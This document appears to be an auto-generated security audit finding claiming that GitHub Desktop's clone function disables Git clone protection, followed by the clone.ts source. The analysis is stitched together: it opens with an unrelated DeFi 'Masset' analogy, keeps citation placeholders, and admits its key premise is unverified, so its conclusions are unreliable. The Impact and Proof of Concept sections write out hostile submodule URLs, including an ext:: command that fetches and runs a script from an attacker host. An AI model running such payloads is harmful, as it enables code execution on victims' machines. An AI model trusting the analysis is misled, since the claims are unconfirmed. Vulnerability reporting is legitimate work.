## Title
Recursive clone always disables Git's clone protocol protection (`GIT_CLONE_PROTECTION_ACTIVE=false`), allowing malicious submodule URLs to be fetched during clone — ([File: app/src/lib/git/clone.ts])

### Summary
Similar to the Masset `_redeemTo` issue — where a safety invariant (the collateralisation ratio) was expected to be enforced elsewhere but nothing in the function itself checked it — GitHub Desktop's `clone()` function unconditionally disables Git's built-in clone-time protocol protection for every clone, including `--recursive` clones that fetch attacker-defined submodules, instead of validating or scoping this override to a case where it is actually safe.

### Finding Description
`clone()` in [1](#0-0)  builds the execution environment for every invocation of `git clone --recursive` and unconditionally sets:

```
GIT_CLONE_PROTECTION_ACTIVE: 'false'
```

This happens regardless of the URL being cloned, whether the user trusts the source, or whether `--recursive` submodule fetching is even expected to touch untrusted content. Git itself uses clone protection to restrict which protocols (`file://`, `ext::`, etc.) are permitted to be used by submodule URLs during a recursive clone, precisely because a repository under an attacker's control can specify arbitrary submodule URLs in `.gitmodules`, and unrestricted protocols like `ext::` can be abused to execute arbitrary local commands, while `file://` can be abused to read/exfiltrate local files outside the intended clone destination.

The code comment/design elsewhere in the same file (`isClonePathSensitive`) explicitly demonstrates that this codebase is aware attacker-controlled URLs can be used to escape intended boundaries [2](#0-1) , yet the recursive submodule fetch step for the very same clone operation disables Git's own protocol allowlist rather than performing (or relying on) an explicit, validated allowlist of safe submodule protocols. This mirrors the audit finding precisely: the code assumes an external invariant (that it's always safe to disable clone protection here) instead of enforcing it in the function.

Separately, `updateSubmodulesAfterOperation` in [3](#0-2)  takes an explicit `allowFileProtocol` boolean and only passes `protocol.file.allow=always` when the caller opts in — this is the correctly-scoped pattern. `clone.ts`, by contrast, does not scope its override at all; it applies to 100% of clone operations.

### Impact Explanation
If Git's default clone protection would otherwise reject `ext::`/`file://` submodule URLs, this override removes that protection for every single clone Desktop performs, including cloning of unknown/untrusted public repositories. A malicious `.gitmodules` entry with a URL like `ext::sh -c "curl attacker.com/x|sh"` or a `file://` URL pointing to sensitive local paths could be fetched during the recursive submodule step, resulting in command execution or file disclosure outside the intended clone directory — squarely within the "attacker controls a cloned/fetched repository" impact category.

### Likelihood Explanation
Likelihood is high for exposure (every clone with submodules exercises this code path) but I was unable to fully confirm, within this session, the exact operational semantics of `GIT_CLONE_PROTECTION_ACTIVE` in the bundled Git version (i.e., whether it is purely informational/internal or genuinely gates protocol enforcement, and whether other layered defenses such as `protocol.allow` defaults still block the request). This should be verified against the exact embedded Git version's source/documentation before treating this as confirmed-exploitable, but the unconditional disabling of a protection flag named specifically for this scenario, with no scoping or validation, is a genuine missing-validation defect matching the reported bug class.

### Recommendation
- Do not unconditionally set `GIT_CLONE_PROTECTION_ACTIVE: 'false'` for every clone. Scope any override to only the cases actually requiring it (mirroring the explicit `allowFileProtocol` flag pattern already used in `submodule.ts`/`checkout.ts`).
- If clone protection needs to be relaxed for legitimate local-repo cloning scenarios (as `isClonePathSensitive` suggests this file is aware of), gate that relaxation behind an explicit check of the source URL's protocol/trust level, not a blanket environment override.
- Add regression tests (parallel to `clone-path-safety-test.ts`) that verify a crafted `.gitmodules` with `ext::`/`file://` submodule URLs is rejected during `clone --recursive`.

### Proof of Concept
1. Attacker creates and publishes a public repository containing a `.gitmodules` file with a submodule URL such as `ext::sh -c "id > /tmp/pwned"%20` (or a `file://` URL pointing at a sensitive local directory outside the clone destination).
2. Victim uses GitHub Desktop to clone the attacker's repository via `_clone`/`CloningRepositoriesStore.clone` → `git/clone.ts:clone()` [4](#0-3) .
3. Because `GIT_CLONE_PROTECTION_ACTIVE` is forced to `'false'` for the underlying `git -c init.defaultBranch=... clone --recursive -- <url> <path>` invocation, Git's default protection intended to block risky submodule protocols during recursive clone does not apply, and the attacker-controlled submodule URL is processed, potentially executing the embedded command or reading local files.

/**
 * Check whether a resolved clone path targets a sensitive location that
 * should never be used as a clone destination. This is a backstop against
 * path traversal attacks where a crafted URL tricks the UI into deriving
 * a clone path outside the intended base directory.
 */
function isClonePathSensitive(unresolvedClonePath: string): boolean {
  const clonePath = Path.resolve(unresolvedClonePath).toLowerCase()
  const home = Path.resolve(homedir()).toLowerCase()

  if (clonePath === home) {
    return true
  }

  const sensitiveLocations = [
    Path.join(home, '.ssh'),
    Path.join(home, '.gnupg'),
    Path.join(home, '.config'),
    Path.join(home, '.config', 'git'),
    Path.join(home, '.gitconfig'),
  ]

  if (__WIN32__) {
    const appData = process.env.APPDATA
    if (appData) {
      sensitiveLocations.push(appData.toLowerCase())
      sensitiveLocations.push(Path.join(appData, 'gnupg').toLowerCase())
    }
  }

  for (const sensitive of sensitiveLocations) {
    if (clonePath === sensitive || clonePath.startsWith(sensitive + Path.sep)) {
      return true
    }
  }

  return false
}

export async function clone(
  url: string,
  path: string,
  options: CloneOptions,
  progressCallback?: (progress: ICloneProgress) => void
): Promise<void> {
  if (isClonePathSensitive(path)) {
    throw new Error(
      `The clone destination "${path}" targets a sensitive system location. ` +
        'Cloning into this directory is not allowed.'
    )
  }

  const env = {
    ...(await envForRemoteOperation(url)),
    GIT_CLONE_PROTECTION_ACTIVE: 'false',
  }

  const defaultBranch = options.defaultBranch ?? (await getDefaultBranch())

  const args = [
    '-c',
    `init.defaultBranch=${defaultBranch}`,
    'clone',
    '--recursive',
  ]

  let opts: IGitStringExecutionOptions = { env }

  if (progressCallback) {
    args.push('--progress')

    const title = `Cloning into ${path}`
    const kind = 'clone'

    opts = await executionOptionsWithProgress(
      { ...opts, trackLFSProgress: true },
      new CloneProgressParser(),
      progress => {
        const description =
          progress.kind === 'progress' ? progress.details.text : progress.text
        const value = progress.percent

        progressCallback({ kind, title, description, value })
      }
    )

    // Initial progress
    progressCallback({ kind, title, value: 0 })
  }

  if (options.branch) {
    args.push('-b', options.branch)
  }

  args.push('--', url, path)

  await git(args, __dirname, 'clone', opts)
}
